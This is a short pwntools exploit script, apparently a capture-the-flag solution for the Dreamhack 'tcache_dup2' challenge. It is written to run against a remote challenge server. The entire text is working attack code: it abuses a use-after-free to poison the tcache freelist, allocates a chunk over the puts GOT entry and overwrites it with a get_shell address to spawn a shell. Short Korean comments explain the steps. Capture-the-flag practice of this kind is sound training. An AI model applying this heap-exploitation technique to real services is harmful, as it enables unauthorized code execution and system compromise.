from pwn import *

r = remote("host3.dreamhack.games", 9128)
e = ELF("./tcache_dup2")
libc = ELF("./libc-2.30.so")

puts_got = e.got["puts"]
printf_got = e.got["printf"]
get_shell = e.symbols["get_shell"]

def create(size, data):
    r.sendlineafter("> ", str(1))
    r.sendlineafter("Size: ", str(size))
    r.sendafter("Data: ", data)

def modify(idx, size, data):
    r.sendlineafter("> ", str(2))
    r.sendlineafter("idx: ", str(idx))
    r.sendlineafter("Size: ", str(size))
    r.sendafter("Data: ", data)

def delete(idx):
    r.sendlineafter("> ", str(3))
    r.sendlineafter("idx: ", str(idx))


create(16,"data") # ptr[0] = "data"
create(16, "a")   # ptr[1] = "a"
delete(0) # free(ptr[0])
delete(1) # free(ptr[1])
modify(1, 10, p64(puts_got)) # ptr[1] = p64(puts_got). fd에 쓰인다.
# (free 후에 pointer 초기화 안해서...ptr[1]이 해제되어서 생긴 청크의 fd에 puts_got이 쓰인다.)

create(16, "data") # ptr[2] = "data"  (data chunk 이용)
create(16, p64(get_shell)) #ptr[3] = p64(get_shell) (puts_got chunk 이용)



r.interactive()